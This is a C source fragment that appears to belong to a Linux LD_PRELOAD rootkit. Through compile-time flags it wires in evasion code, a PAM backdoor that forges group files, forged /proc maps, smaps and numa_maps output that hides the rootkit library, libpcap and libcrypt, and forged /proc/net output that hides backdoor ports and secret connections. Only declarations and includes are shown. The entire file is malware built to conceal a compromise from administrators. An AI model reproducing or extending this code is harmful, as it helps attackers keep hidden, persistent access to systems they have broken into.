#include "files/files.h"

#ifdef DO_EVASIONS
#include "evasion/evasion.h"
#endif

#ifdef USE_PAM_BD
FILE *forgegroups(const char *pathname);
#include "groupsforge.c"
#endif

#ifdef FORGE_MAPS
// lines containing these vvv are redacted. this should be ok the way it is.
// but if not..u know whatta do
static char* const bads[3] = {BDVLSO, "libpcap", "libcrypt"};
char *badstring(char *buf);
FILE *forge_maps(const char *pathname);
FILE *forge_smaps(const char *pathname);
FILE *forge_numamaps(const char *pathname);
#include "mapsforge.c"
#endif

#ifdef HIDE_PORTS
int is_hidden_port(int port);
int secret_connection(char line[]);
int hideport_alive(void);
FILE *forge_procnet(const char *pathname);
#include "procnetforge.c"
#endif
